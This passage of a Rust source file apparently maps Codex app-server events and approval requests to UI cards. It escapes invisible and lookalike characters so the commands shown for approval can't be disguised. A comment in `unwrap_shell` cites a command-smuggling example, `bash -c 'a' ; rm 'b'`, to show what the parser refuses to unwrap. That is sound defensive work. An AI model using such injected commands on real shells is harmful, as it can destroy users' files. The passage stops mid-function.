//! Codex's app-server notifications and approval requests as `UiEvent`s (the language every provider speaks to the UI).
//! Pure of any process: the session feeds it one JSON-RPC message at a time, so a transcript can be replayed in a test.
//!
//! Shapes are read from the schema `codex app-server generate-ts` writes (0.162.1); fields are looked up leniently, since
//! the protocol adds some with every release and a missing one must not end a chat.

use crate::stream_parser::{summarize, truncate, OUTPUT_LIMIT};
use crate::ui_event::{Hunk, ModelOption, UiEvent};
use serde_json::{json, Value};
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

/// How many times Codex retries a dropped response stream before giving up (its `stream_max_retries` default): only used
/// to show "Retrying (2/5)".
const RETRIES: u64 = 5;

/// What one message turned into: the events for the UI, and the edits whose "before" is known (path, content before; None
/// when the file is new) for the Changes pane. An edit whose "before" can't be worked out cleanly is left out of `edits`
/// (Changes still lists the file from the git scan): a wrong "before" would make Revert write the wrong text back.
#[derive(Default, Debug)]
pub struct Mapped {
    pub events: Vec<UiEvent>,
    pub edits: Vec<(String, Option<String>)>,
}

/// An approval Codex asks the user for, as a card.
#[derive(Debug, Clone, PartialEq)]
pub struct Approval {
    pub kind: ApprovalKind,
    /// Which tool the card is for, from the method of the request (a file change is a Write when every file is new).
    pub tool_name: String,
    /// What the card shows, every text already written out so that nothing in it can read as something else (see `visible`).
    pub input: Value,
    /// The fileChange item a file-change card is about: when its files change, the card is raised again.
    pub item: Option<String>,
}

/// An approval request that was read: a card to ask with, or why it can't be shown as it is. Codex waits for an answer to
/// every request, so the second is declined at once (and said) and is never asked: what the user can't see can't be allowed.
pub type Request = Result<Approval, String>;

#[derive(Debug, Clone, PartialEq)]
pub enum ApprovalKind {
    Command,
    FileChange,
    /// Extra permissions (network, folders) for a turn; `requested` is what was asked, which allowing grants.
    Permissions { requested: Value },
}

/// One file of a fileChange item, as Codex sent it.
#[derive(Debug, Clone)]
struct Change {
    path: String,
    /// "add", "delete" or "update"; anything else is a kind this doesn't know (or none).
    kind: String,
    move_path: Option<String>,
    diff: String,
}

#[derive(Default)]
struct TurnStats {
    /// The thread's token total just before this turn, worked out from its first usage update (total − last).
    baseline: Option<u64>,
    declined: usize,
    retries: u64,
}

pub struct CodexMapper {
    cwd: PathBuf,
    /// Tools announced and not yet finished, so a finish without a start still shows a step.
    open: HashSet<String>,
    /// A command item's whole command, for test-run detection.
    commands: HashMap<String, String>,
    /// A fileChange item's changes as of its start (or latest patch update), which an approval request refers to.
    files: HashMap<String, Vec<Change>>,
    thinking: HashSet<String>,
    turn: TurnStats,
    session_tokens: u64,
    context_window: Option<u64>,
    /// The thread's token total as of the latest usage update.
    last_total: Option<u64>,
}

impl CodexMapper {
    pub fn new(cwd: &Path) -> Self {
        CodexMapper { cwd: cwd.to_path_buf(), open: HashSet::new(), commands: HashMap::new(), files: HashMap::new(), thinking: HashSet::new(), turn: TurnStats::default(), session_tokens: 0, context_window: None, last_total: None }
    }

    /// A server notification (method and params as received).
    pub fn notification(&mut self, method: &str, p: &Value) -> Mapped {
        let mut m = Mapped::default();
        match method {
            "turn/started" => self.turn = TurnStats::default(),
            "item/started" => self.item_started(&p["item"], &mut m),
            "item/completed" => self.item_completed(&p["item"], &mut m),
            "item/agentMessage/delta" => {
                let text = p["delta"].as_str().unwrap_or("");
                if !text.is_empty() {
                    m.events.push(UiEvent::TextDelta { parent: None, block_id: str_of(p, "itemId"), text: text.to_string() });
                }
            }
            "item/fileChange/patchUpdated" => {
                let changes = changes_of(&p["changes"]);
                if !changes.is_empty() {
                    self.files.insert(str_of(p, "itemId"), changes);
                }
            }
            "thread/tokenUsage/updated" => self.token_usage(&p["tokenUsage"], &mut m),
            "error" if p["willRetry"] == true => {
                self.turn.retries += 1;
                m.events.push(UiEvent::Retrying { attempt: self.turn.retries, max_retries: RETRIES.max(self.turn.retries), error: p["error"]["message"].as_str().unwrap_or("The connection dropped.").to_string() });
            }
            "turn/completed" => self.turn_completed(&p["turn"], &mut m),
            // The final error of a turn is on its turn/completed; the rest (warnings, rate limits, thread and account
            // bookkeeping) is not conversation.
            _ => {}
        }
        m
    }

    fn item_started(&mut self, item: &Value, m: &mut Mapped) {
        let id = str_of(item, "id");
        match item["type"].as_str().unwrap_or("") {
            "reasoning" => {
                if self.thinking.insert(id) {
                    m.events.push(UiEvent::Thinking { parent: None });
                }
            }
            "commandExecution" => {
                let command = unwrap_shell(item["command"].as_str().unwrap_or(""));
                self.commands.insert(id.clone(), command.clone());
                self.start_tool(&id, "Bash", summarize("Bash", &json!({"command": visible(&command, true)})), m);
            }
            "fileChange" => {
                let changes = changes_of(&item["changes"]);
                let name = if !changes.is_empty() && changes.iter().all(|c| c.kind == "add") { "Write" } else { "Edit" };
                let summary = truncate(&visible(&changes.iter().map(|c| self.rel(&c.path)).collect::<Vec<_>>().join(", "), false), 200);
                self.files.insert(id.clone(), changes);
                self.start_tool(&id, name, summary, m);
            }
            "mcpToolCall" => self.start_tool(&id, &visible(&format!("mcp__{}__{}", str_of(item, "server"), str_of(item, "tool")), false), truncate(&item["arguments"].to_string(), 200), m),
            // Named as its own, so a tool called "Bash" is not mistaken for the shell.
            "dynamicToolCall" => self.start_tool(&id, &visible(&format!("dynamic__{}", str_of(item, "tool")), false), truncate(&item["arguments"].to_string(), 200), m),
            "webSearch" => self.start_tool(&id, "WebSearch", summarize("WebSearch", &json!({"query": item["query"]})), m),
            "collabAgentToolCall" => self.start_tool(&id, "Agent", truncate(item["prompt"].as_str().unwrap_or(""), 200), m),
            _ => {}
        }
    }

    fn start_tool(&mut self, id: &str, name: &str, summary: String, m: &mut Mapped) {
        if self.open.insert(id.to_string()) {
            m.events.push(UiEvent::ToolStarted { parent: None, tool_use_id: id.to_string(), name: name.to_string(), summary });
        }
    }

    fn item_completed(&mut self, item: &Value, m: &mut Mapped) {
        let id = str_of(item, "id");
        match item["type"].as_str().unwrap_or("") {
            "agentMessage" => {
                let text = str_of(item, "text");
                if !text.trim().is_empty() {
                    m.events.push(UiEvent::AssistantText { parent: None, block_id: id, text });
                }
            }
            "commandExecution" => {
                self.item_started(item, m);
                let status = item["status"].as_str().unwrap_or("");
                let declined = status == "declined";
                if declined {
                    self.turn.declined += 1;
                }
                let is_error = status != "completed" || item["exitCode"].as_i64().is_some_and(|c| c != 0);
                let output = if declined { "Declined.".to_string() } else { str_of(item, "aggregatedOutput") };
                let command = self.commands.remove(&id);
                let test_run = command.and_then(|command| {
                    let mut run = crate::test_runs::detect(&command, &output)?;
                    if is_error {
                        run.outcome = crate::test_runs::Outcome::Failed;
                    }
                    Some(UiEvent::TestRun { parent: None, tool_use_id: id.clone(), command, run })
                });
                self.open.remove(&id);
                m.events.push(UiEvent::ToolFinished { parent: None, tool_use_id: id, is_error, output: truncate(&output, OUTPUT_LIMIT) });
                m.events.extend(test_run);
            }
            "fileChange" => {
                let mut changes = changes_of(&item["changes"]);
                if changes.is_empty() {
                    changes = self.files.get(&id).cloned().unwrap_or_default();
                }
                self.files.insert(id.clone(), changes.clone());
                self.item_started(&json!({"type": "fileChange", "id": id, "changes": item["changes"]}), m);
                let status = item["status"].as_str().unwrap_or("");
                let done = status == "completed";
                if status == "declined" {
                    self.turn.declined += 1;
                }
                if done {
                    for c in &changes {
                        self.file_edit(&id, c, m);
                    }
                }
                self.files.remove(&id);
                self.open.remove(&id);
                let output = match status {
                    "completed" => changes.iter().map(|c| format!("{} {}", verb(&c.kind), self.rel(&c.path))).collect::<Vec<_>>().join("\n"),
                    "declined" => "Declined.".to_string(),
                    _ => "The change could not be applied.".to_string(),
                };
                m.events.push(UiEvent::ToolFinished { parent: None, tool_use_id: id, is_error: !done, output: truncate(&output, OUTPUT_LIMIT) });
            }
            "mcpToolCall" | "dynamicToolCall" | "webSearch" | "collabAgentToolCall" => {
                self.item_started(item, m);
                let status = item["status"].as_str().unwrap_or("");
                let failed = matches!(status, "failed" | "declined") || item["error"].is_object() || item["success"] == false;
                let output = if let Some(e) = item["error"]["message"].as_str() { e.to_string() } else { tool_output(item) };
                self.open.remove(&id);
                m.events.push(UiEvent::ToolFinished { parent: None, tool_use_id: id, is_error: failed, output: truncate(&output, OUTPUT_LIMIT) });
            }
            _ => {}
        }
    }

    /// One file of a finished fileChange: its hunks for the UI, and what it was before for the Changes pane.
    fn file_edit(&mut self, id: &str, c: &Change, m: &mut Mapped) {
        let at = self.abs(c.move_path.as_deref().unwrap_or(&c.path));
        let path = at.display().to_string();
        let (created, hunks, before) = match c.kind.as_str() {
            "add" => (true, whole_file(&c.diff, '+'), Some(None)),
            "delete" => (false, whole_file(&c.diff, '-'), Some(Some(c.diff.clone()))),
            "update" => {
                let diff = match &c.move_path {
                    Some(_) => c.diff.rsplit_once("\n\nMoved to:").map_or(c.diff.as_str(), |(d, _)| d),
                    None => c.diff.as_str(),
                };
                let hunks = parse_unified(diff);
                let before = std::fs::read_to_string(&at).ok().and_then(|now| reverse_apply(&now, &hunks)).map(Some);
                (false, hunks, before)
            }
            // A kind this doesn't know: nothing is shown as done that isn't understood.
            _ => return,
        };
        let original = before.clone().flatten();
        m.events.push(UiEvent::EditApplied { parent: None, tool_use_id: id.to_string(), path: path.clone(), created, hunks, original });
        if let Some(original) = before {
            m.edits.push((path, original));
        }
    }

    fn token_usage(&mut self, usage: &Value, m: &mut Mapped) {
        let total = usage["total"]["totalTokens"].as_u64();
        let last = usage["last"]["totalTokens"].as_u64();
        if let Some(total) = total {
            self.session_tokens = total;
            self.last_total = Some(total);
            if self.turn.baseline.is_none() {
                self.turn.baseline = Some(total.saturating_sub(last.unwrap_or(0)));
            }
        }
        if let Some(w) = usage["modelContextWindow"].as_u64() {
            self.context_window = Some(w);
        }
        if let Some(tokens) = last.filter(|t| *t > 0) {
            m.events.push(UiEvent::ContextUsed { tokens });
        }
    }

    fn turn_completed(&mut self, turn: &Value, m: &mut Mapped) {
        let status = turn["status"].as_str().unwrap_or("");
        let (is_error, result) = match status {
            "completed" => (false, None),
            "interrupted" => (true, Some("interrupted".to_string())),
            _ => (true, Some(failure_text(&turn["error"]))),
        };
        let tokens = self.turn.baseline.zip(self.last_total).map(|(base, now)| now.saturating_sub(base));
        m.events.push(UiEvent::TurnDone {
            is_error,
            result,
            // Codex reports tokens, not dollars: nothing is made up.
            cost_usd: None,
            tokens,
            session_cost_usd: None,
            session_tokens: self.session_tokens,
            duration_ms: turn["durationMs"].as_u64(),
            // Said once more, as the banner that tells how to sign in.
            auth_hint: is_error && turn["error"]["codexErrorInfo"] == "unauthorized",
            denied: self.turn.declined,
            context_window: self.context_window,
        });
        self.open.clear();
        self.turn = TurnStats::default();
    }

    /// An approval request from the server: None for a method that isn't one, else the card to show or why there can't be one.
    /// The card names what Codex will do from the request's own fields and never from words in them; a field that is missing
    /// or of another type than the protocol's makes the request unreadable, which is declined, not shown as a guess.
    pub fn approval(&self, method: &str, p: &Value) -> Option<Request> {
        match method {
            "item/commandExecution/requestApproval" => Some(self.command_card(p)),
            "item/fileChange/requestApproval" => Some(self.file_card(p)),
            "item/permissions/requestApproval" => Some(self.permissions_card(p)),
            _ => None,
        }
    }

    /// Codex's own reason for asking, which is only what it says: the card gives it as such.
    fn reason(p: &Value) -> Result<Option<String>, String> {
        match p.get("reason") {
            None | Some(Value::Null) => Ok(None),
            Some(Value::String(r)) => Ok(Some(visible(r, true)).filter(|r| !r.trim().is_empty())),
            Some(_) => Err("its reason isn't text".into()),
        }
    }

    fn command_card(&self, p: &Value) -> Request {
        let mut seen = Lookalikes::default();
        // The command exactly as Codex will run it, shell wrapper and all: what is approved is what is shown, not a
        // tidied-up reading of it (the steps in the chat do take the wrapper off).
        let command = match p.get("command") {
            None | Some(Value::Null) => None,
            Some(Value::String(c)) if !c.trim().is_empty() => Some(seen.shown(c, true)),
            Some(_) => return Err("its command isn't text".into()),
        };
        let network = match p.get("networkApprovalContext") {
            None | Some(Value::Null) => None,
            Some(n) => {
                let host = n["host"].as_str().filter(|h| !h.trim().is_empty()).ok_or("its network request has no host")?;
                let protocol = n["protocol"].as_str().filter(|h| !h.trim().is_empty()).ok_or("its network request has no protocol")?;
                Some(format!("{} ({})", seen.shown(host, false), visible(protocol, false)))
            }
        };
        let stdin = match p.get("kind") {
            None | Some(Value::Null) => false,
            Some(k) if k == "command" => false,
            Some(k) if k == "writeStdin" => true,
            Some(_) => return Err("it is a kind of request Lantern doesn't know".into()),
        };
        // Where it runs: Codex's word for it, else the folder the chat is in.
        let cwd = match p.get("cwd") {
            None | Some(Value::Null) => self.cwd.display().to_string(),
            Some(Value::String(c)) if !c.trim().is_empty() => c.clone(),
            Some(_) => return Err("its folder isn't text".into()),
        };
        let mut input = json!({"provider": "codex", "cwd": seen.shown(&cwd, false)});
        match (&command, &network, stdin) {
            (Some(c), _, false) => input["command"] = c.clone().into(),
            (Some(c), _, true) => {
                input["command"] = c.clone().into();
                input["action"] = "Send input to this running command (what is sent is not shown)".into();
            }
            (None, Some(_), false) => input["action"] = "Network access".into(),
            (None, _, true) => input["action"] = "Send input to a running command (which one, and what is sent, is not shown)".into(),
            (None, None, false) => return Err("it doesn't say what it would run".into()),
        }
        if let Some(n) = network {
            input["network"] = n.into();
        }
        if let Some(r) = Self::reason(p)? {
            input["description"] = r.into();
        }
        seen.add_to(&mut input);
        Ok(Approval { kind: ApprovalKind::Command, tool_name: "Bash".into(), input, item: None })
    }

    fn file_card(&self, p: &Value) -> Request {
        let mut seen = Lookalikes::default();
        let id = p["itemId"].as_str().filter(|i| !i.is_empty()).ok_or("it doesn't say which change it is")?;
        let changes = self.files.get(id).filter(|c| !c.is_empty()).ok_or("Lantern was not told which files it changes")?;
        // Every file it will touch, one to a line with what happens to it (a delete never reads as an edit), never a first
        // one and a count. Control characters in a name are escaped, so a name can't fake a line of its own.
        let mut lines = Vec::new();
        let mut outside = Vec::new();
        for c in changes {
            if c.path.is_empty() || c.move_path.as_deref() == Some("") {
                return Err("one of its files has no name".into());
            }
            let at = |path: &str, seen: &mut Lookalikes| seen.shown(&self.abs(path).display().to_string(), false);
            lines.push(match (c.kind.as_str(), &c.move_path) {
                ("add", _) => format!("Create {}", at(&c.path, &mut seen)),
                ("delete", _) => format!("Delete {}", at(&c.path, &mut seen)),
                ("update", Some(to)) => format!("Move {} → {}", at(&c.path, &mut seen), at(to, &mut seen)),
                ("update", None) => format!("Edit {}", at(&c.path, &mut seen)),
                _ => return Err("one of its files is changed in a way Lantern doesn't know".into()),
            });
            for path in std::iter::once(&c.path).chain(c.move_path.as_ref()) {
                if !self.inside(path) {
                    outside.push(seen.shown(&self.abs(path).display().to_string(), false));
                }
            }
        }
        let tool = if changes.iter().all(|c| c.kind == "add") { "Write" } else { "Edit" };
        let mut input = json!({"provider": "codex", "file_path": lines.join("\n")});
        if let Some(r) = Self::reason(p)? {
            input["description"] = r.into();
        }
        let mut warnings = Vec::new();
        // It may ask for more than these files: that is said, though only this change is accepted. (Lantern's own words, kept
        // out of Codex's reason, which can say anything.)
        match p.get("grantRoot") {
            None | Some(Value::Null) => {}
            Some(Value::String(r)) => warnings.push(format!("Also asks for write access under {}/ (not granted: only this change is).", seen.shown(r, false))),
            Some(_) => return Err("the folder it also asks for isn't text".into()),
        }
        outside.dedup();
        warnings.extend(outside.iter().map(|path| format!("Outside this chat's folder: {path}")));
        warnings.extend(seen.warning());
        if !warnings.is_empty() {
            input["warnings"] = warnings.into();
        }
        Ok(Approval { kind: ApprovalKind::FileChange, tool_name: tool.into(), input, item: Some(id.to_string()) })
    }

    fn permissions_card(&self, p: &Value) -> Request {
        let mut seen = Lookalikes::default();
        let asked = p["permissions"].as_object().ok_or("the permissions it asks for aren't an object")?;
        if asked.keys().any(|k| k != "network" && k != "fileSystem") {
            return Err("it asks for a kind of permission Lantern doesn't know".into());
        }
        let cwd = p["cwd"].as_str().filter(|c| !c.is_empty()).ok_or("it doesn't say what folder it is about")?;
        let mut lines: Vec<String> = Vec::new();
        let mut depth = None;
        match asked.get("network") {
            None | Some(Value::Null) => {}
            Some(Value::Object(n)) => {
                if n.keys().any(|k| k != "enabled") || n.get("enabled").is_some_and(|e| !e.is_boolean() && !e.is_null()) {
                    return Err("its network permission is of a shape Lantern doesn't know".into());
                }
                if n.get("enabled") == Some(&Value::Bool(true)) {
                    lines.push("Use the network".into());
                }
            }
            Some(_) => return Err("its network permission isn't an object".into()),
        }
        match asked.get("fileSystem") {
            None | Some(Value::Null) => {}
            Some(Value::Object(f)) => {
                if f.keys().any(|k| !matches!(k.as_str(), "entries" | "read" | "write" | "globScanMaxDepth")) {
                    return Err("its file permission is of a shape Lantern doesn't know".into());
                }
                for (key, verb) in [("read", "Read"), ("write", "Write")] {
                    match f.get(key) {
                        None | Some(Value::Null) => {}
                        Some(Value::Array(paths)) => {
                            for path in paths {
                                lines.push(format!("{verb} {}", seen.shown(path.as_str().ok_or("a path it asks for isn't text")?, false)));
                            }
                        }
                        Some(_) => return Err("its file permission isn't a list".into()),
                    }
                }
                match f.get("entries") {
                    None | Some(Value::Null) => {}
                    Some(Value::Array(entries)) => {
                        for e in entries {
                            let verb = match e["access"].as_str() {
                                Some("read") => "Read",
                                Some("write") => "Write",
                                Some("deny") => "Never touch",
                                _ => return Err("one of its file permissions has an access Lantern doesn't know".into()),
                            };
                            lines.push(format!("{verb} {}", Self::place(&e["path"], &mut seen)?));
                        }
                    }
                    Some(_) => return Err("its file permissions aren't a list".into()),
                }
                match f.get("globScanMaxDepth") {
                    None | Some(Value::Null) => {}
                    Some(d) if d.is_u64() => depth = Some(d.to_string()),
                    Some(_) => return Err("its search depth isn't a number".into()),
                }
            }
            Some(_) => return Err("its file permission isn't an object".into()),
        }
        if lines.is_empty() {
            return Err("it asks for no permission at all".into());
        }
        lines.extend(depth.map(|d| format!("(patterns are searched {d} folders deep)")));
        let mut input = json!({"provider": "codex", "permissions": lines.join("\n"), "cwd": seen.shown(cwd, false)});
        if let Some(r) = Self::reason(p)? {
            input["description"] = r.into();
        }
        seen.add_to(&mut input);
        let requested = Value::Object(asked.clone());
        Ok(Approval { kind: ApprovalKind::Permissions { requested }, tool_name: "Permissions".into(), input, item: None })
    }

    /// A place a permission is about, in words.
    fn place(path: &Value, seen: &mut Lookalikes) -> Result<String, String> {
        match path["type"].as_str() {
            Some("path") => Ok(seen.shown(path["path"].as_str().ok_or("a path it asks for isn't text")?, false)),
            Some("glob_pattern") => Ok(format!("anything matching {}", seen.shown(path["pattern"].as_str().ok_or("a pattern it asks for isn't text")?, false))),
            Some("special") => match path["value"]["kind"].as_str() {
                Some("root") => Ok("the whole disk".into()),
                Some("minimal") => Ok("the system folders a program needs to start".into()),
                Some("project_roots") => {
                    let sub = match &path["value"]["subpath"] {
                        Value::Null => String::new(),
                        Value::String(s) => format!("/{}", seen.shown(s, false)),
                        _ => return Err("a subfolder it asks for isn't text".into()),
                    };
                    Ok(format!("the project folder{sub}"))
                }
                Some("tmpdir") => Ok("the temporary folder".into()),
                Some("slash_tmp") => Ok("/tmp".into()),
                _ => Err("a place it asks for is one Lantern doesn't know".into()),
            },
            _ => Err("a place it asks for is one Lantern doesn't know".into()),
        }
    }

    /// Whether `path` is in the folder the chat is in, read as written (`..` taken at its word, no links followed).
    fn inside(&self, path: &str) -> bool {
        let mut parts: Vec<std::ffi::OsString> = Vec::new();
        for c in self.abs(path).components() {
            match c {
                std::path::Component::ParentDir => {
                    parts.pop();
                }
                std::path::Component::CurDir => {}
                other => parts.push(other.as_os_str().to_owned()),
            }
        }
        let root: PathBuf = self.cwd.components().filter(|c| !matches!(c, std::path::Component::CurDir)).collect();
        parts.iter().collect::<PathBuf>().starts_with(root)
    }

    fn abs(&self, path: &str) -> PathBuf {
        let p = Path::new(path);
        if p.is_absolute() { p.to_path_buf() } else { self.cwd.join(p) }
    }

    /// `path` as the folder the chat shows it.
    fn rel(&self, path: &str) -> String {
        self.abs(path).strip_prefix(&self.cwd).map(|p| p.display().to_string()).unwrap_or_else(|_| path.to_string())
    }
}

/// A thread as `thread/read` returns it (its turns, each with its items) as the events it would have shown: for a worker's
/// conversation read by its main agent (see orchestra's read_agent), not for the window. Tool steps are announced as they
/// finish, and the files an edit touched are looked at only to show their hunks; none of it is recorded anywhere.
pub fn thread_events(cwd: &Path, thread: &Value) -> Vec<UiEvent> {
    let mut mapper = CodexMapper::new(cwd);
    let mut out = Vec::new();
    for turn in thread["turns"].as_array().into_iter().flatten() {
        for item in turn["items"].as_array().into_iter().flatten() {
            if item["type"] == "userMessage" {
                let text = item["content"].as_array().into_iter().flatten().filter_map(|c| c["text"].as_str()).collect::<Vec<_>>().join("\n");
                if !text.trim().is_empty() {
                    out.push(UiEvent::UserText { text, at: None, sent_by: None, images: 0 });
                }
            } else {
                out.extend(mapper.notification("item/completed", &json!({"item": item})).events);
            }
        }
        out.extend(mapper.notification("turn/completed", &json!({"turn": turn})).events);
    }
    out
}

/// `text` as a card shows it, with nothing in it that can make it read as something else: control characters (and line
/// breaks, unless `lines`) and the characters that reorder, hide or fake text (bidi overrides and isolates, zero-width and
/// joiner characters, variation selectors, tags, fillers, private use, every space but the plain one) are written out as
/// escapes. What is approved is what was seen.
pub fn visible(text: &str, lines: bool) -> String {
    text.chars()
        .map(|c| {
            let kept = lines && (c == '\n' || c == '\t');
            if (c.is_control() && !kept) || unseen(c) { c.escape_unicode().to_string() } else { c.to_string() }
        })
        .collect()
}

/// A character that prints as nothing, or as a gap, or changes how the text around it is laid out. (Plain space stays; a
/// tab and a line break stay where a card allows them, see `visible`.)
fn unseen(c: char) -> bool {
    matches!(c,
        '\u{00AD}' | '\u{034F}' | '\u{061C}' | '\u{115F}' | '\u{1160}' | '\u{17B4}' | '\u{17B5}' | '\u{180B}'..='\u{180F}'
        | '\u{200B}'..='\u{200F}' | '\u{2028}'..='\u{202E}' | '\u{2060}'..='\u{206F}' | '\u{3164}' | '\u{FE00}'..='\u{FE0F}'
        | '\u{FEFF}' | '\u{FFA0}' | '\u{FFF9}'..='\u{FFFC}' | '\u{E000}'..='\u{F8FF}' | '\u{E0000}'..='\u{E007F}' | '\u{E0100}'..='\u{E01EF}'
        | '\u{F0000}'..='\u{FFFFD}' | '\u{100000}'..='\u{10FFFD}')
        || (c.is_whitespace() && !matches!(c, ' ' | '\n' | '\t'))
}

/// A character that can pass for an ASCII one in a command or a path: a Cyrillic or Greek letter for a Latin one, a
/// fullwidth or mathematical letter, a dash or a slash that isn't one. They are not escaped (a folder may really be named in
/// Russian): the card says they are there, which spelling out every character would not.
fn lookalike(c: char) -> bool {
    matches!(c,
        '\u{0250}'..='\u{02FF}' | '\u{0370}'..='\u{03FF}' | '\u{0400}'..='\u{052F}' | '\u{0530}'..='\u{058F}' | '\u{13A0}'..='\u{13FF}'
        | '\u{1D00}'..='\u{1DBF}' | '\u{1C80}'..='\u{1C8F}' | '\u{1F00}'..='\u{1FFF}' | '\u{2010}'..='\u{2015}' | '\u{2044}' | '\u{2100}'..='\u{214F}'
        | '\u{2212}' | '\u{2215}' | '\u{2216}' | '\u{2460}'..='\u{24FF}' | '\u{2571}' | '\u{2C80}'..='\u{2CFF}' | '\u{2DE0}'..='\u{2DFF}'
        | '\u{29F5}' | '\u{29F8}' | '\u{A640}'..='\u{A69F}' | '\u{FE58}' | '\u{FE63}' | '\u{FF00}'..='\u{FFEF}' | '\u{1D400}'..='\u{1D7FF}')
}

/// The characters of a card's texts that can pass for others, in the order they were met: said once, in words, under it.
#[derive(Default)]
struct Lookalikes(Vec<char>);

impl Lookalikes {
    const MOST: usize = 6;

    /// `text` as `visible` writes it, noting its lookalikes.
    fn shown(&mut self, text: &str, lines: bool) -> String {
        for c in text.chars().filter(|c| lookalike(*c)) {
            if !self.0.contains(&c) {
                self.0.push(c);
            }
        }
        visible(text, lines)
    }

    fn warning(&self) -> Option<String> {
        if self.0.is_empty() {
            return None;
        }
        let shown = self.0.iter().take(Self::MOST).map(|c| format!("{c} (U+{:04X})", *c as u32)).collect::<Vec<_>>().join(", ");
        let more = if self.0.len() > Self::MOST { ", and more" } else { "" };
        Some(format!("Has characters that can pass for another one: {shown}{more}."))
    }

    fn add_to(&self, input: &mut Value) {
        if let Some(w) = self.warning() {
            input["warnings"] = json!([w]);
        }
    }
}

/// What a turn's error says to the user; a sign-in problem says what to do.
fn failure_text(error: &Value) -> String {
    let message = error["message"].as_str().filter(|m| !m.is_empty()).unwrap_or("The turn failed.");
    if error["codexErrorInfo"] == "unauthorized" {
        return format!("Codex isn't signed in, or its sign-in expired ({message}). Run `codex login` in a terminal, then send your message again.");
    }
    match error["additionalDetails"].as_str().filter(|d| !d.is_empty()) {
        Some(d) => format!("{message} ({d})"),
        None => message.to_string(),
    }
}

/// The models Codex offers (a `model/list` page's `data`) as the picker lists them: visible ones, with the effort levels
/// Lantern can send (see args::EFFORT_LEVELS). Returns the id Codex uses when none is chosen as well.
pub fn model_options(data: &Value) -> (Vec<ModelOption>, Option<String>) {
    let mut default = None;
    let options = data
        .as_array()
        .into_iter()
        .flatten()
        .filter(|m| m["hidden"] != true)
        .filter_map(|m| {
            let id = m["id"].as_str()?.to_string();
            if m["isDefault"] == true {
                default = Some(id.clone());
            }
            Some(ModelOption {
                display_name: m["displayName"].as_str().unwrap_or(&id).to_string(),
                description: str_of(m, "description"),
                resolved_model: m["model"].as_str().unwrap_or(&id).to_string(),
                effort_levels: m["supportedReasoningEfforts"].as_array().into_iter().flatten().filter_map(|e| e["reasoningEffort"].as_str()).filter(|e| crate::args::valid_effort(e)).map(String::from).collect(),
                value: id,
            })
        })
        .collect();
    (options, default)
}

fn verb(kind: &str) -> &'static str {
    match kind {
        "add" => "Created",
        "delete" => "Deleted",
        _ => "Edited",
    }
}

/// What a tool's finished item says, as text.
fn tool_output(item: &Value) -> String {
    let text = |content: &Value| content.as_array().into_iter().flatten().filter_map(|c| c["text"].as_str().map(String::from)).collect::<Vec<_>>().join("\n");
    match item["type"].as_str().unwrap_or("") {
        "mcpToolCall" => text(&item["result"]["content"]),
        "dynamicToolCall" => text(&item["contentItems"]),
        _ => String::new(),
    }
}

fn changes_of(v: &Value) -> Vec<Change> {
    v.as_array()
        .into_iter()
        .flatten()
        .map(|c| Change {
            path: str_of(c, "path"),
            // As sent: a kind that is missing or new is not an edit, and no card or step says it is (see `file_card`).
            kind: c["kind"]["type"].as_str().unwrap_or("").to_string(),
            move_path: c["kind"]["move_path"].as_str().map(String::from),
            diff: str_of(c, "diff"),
        })
        .collect()
}

fn str_of(v: &Value, key: &str) -> String {
    v.get(key).and_then(Value::as_str).unwrap_or("").to_string()
}

/// The command inside a shell wrapper: Codex runs `/bin/zsh -lc "cargo test"`, and that is `cargo test` to the user.
pub fn unwrap_shell(command: &str) -> String {
    let command = command.trim();
    let Some((program, rest)) = command.split_once(' ') else { return command.to_string() };
    let shell = program.rsplit('/').next().unwrap_or(program);
    if !matches!(shell, "sh" | "bash" | "zsh") {
        return command.to_string();
    }
    let rest = rest.trim_start();
    let Some(script) = rest.strip_prefix("-lc ").or_else(|| rest.strip_prefix("-c ")) else { return command.to_string() };
    let script = script.trim();
    for q in ['"', '\''] {
        if let Some(inner) = script.strip_prefix(q).and_then(|s| s.strip_suffix(q)) {
            // One quoted word, or it isn't taken off: `bash -c 'a' ; rm 'b'` starts and ends with a quote and is not `a' ; rm 'b`.
            return if inner.contains(q) { command.to_string() } else { inner.to_string() };
        }
    }
    // Unquoted, only a single word is the script (`bash -c echo hi` runs `echo`, with `hi` as its $0).
    if script.contains(char::is_whitespace) { command.to_string() } else { script.to_string() }
}

/// The hunks of a whole file's text as added (`+`) or removed (`-`): what a created or deleted file's diff is.
fn whole_file(content: &str, sign: char) -> Vec<Hunk> {
    let lines: Vec<String> = content.lines().map(|l| format!("{sign}{l}")).collect();
    if lines.is_empty() {
        return vec![];
    }
    let n = lines.len() as u64;
    if sign == '+' {
        vec![Hunk { old_start: 0, old_lines: 0, new_start: 1, new_lines: n, lines }]
    } else {
        vec![Hunk { old_start: 1, old_lines: n, new_start: 0, new_lines: 0, lines }]
    }
}

/// A unified diff's hunks (its `---`/`+++` header, if it has one, is skipped); each line keeps its ` `, `+` or `-`.
pub fn parse_unified(diff: &str) -> Vec<Hunk> {
    let mut hunks: Vec<Hunk> = Vec::new();
    for line in diff.lines() {
        if let Some(h) = hunk_header(line) {
            hunks.push(h);
        } else if let Some(h) = hunks.last_mut() {
            if matches!(line.chars().next(), Some(' ' | '+' | '-' | '\\')) {
                h.lines.push(line.to_string());
            }
        }
    }
    hunks
}

fn hunk_header(line: &str) -> Option<Hunk> {
    let rest = line.strip_prefix("@@ -")?;
    let (old, rest) = rest.split_once(" +")?;
    let (new, _) = rest.split_once(" @@")?;
    let range = |s: &str| -> Option<(u64, u64)> {
        match s.split_once(',') {
            Some((a, b)) => Some((a.parse().ok()?, b.parse().ok()?)),
            None => Some((s.parse().ok()?, 1)),
        }
    };
    let ((old_start, old_lines), (new_start, new_lines)) = (range(old)?, range(new)?);
    Some(Hunk { old_start, old_lines, new_start, new_lines, lines: vec![] })
}

/// The file as it was before `hunks` made it `now`, or None when `now` doesn't match what the hunks say they produced:
/// the file changed again since, or the diff isn't one this can read. Never a guess.
pub fn reverse_apply(now: &str, hunks: &[Hunk]) -> Option<String> {
    let current: Vec<&str> = now.split_inclusive('\n').collect();
    let text = |l: &str| l.trim_end_matches(['\n', '\r']).to_string();
    let mut out = String::new();
    let mut pos = 0usize;
    for h in hunks {
        let start = if h.new_lines == 0 { h.new_start } else { h.new_start.checked_sub(1)? } as usize;
        if start < pos || start > current.len() {
            return None;
        }
        for l in &current[pos..start] {
            out.push_str(l);
        }
        pos = start;
        let mut removed_last = false;
        for line in &h.lines {
            let (sign, body) = line.split_at(1);
            match sign {
                " " | "+" => {
                    let have = current.get(pos)?;
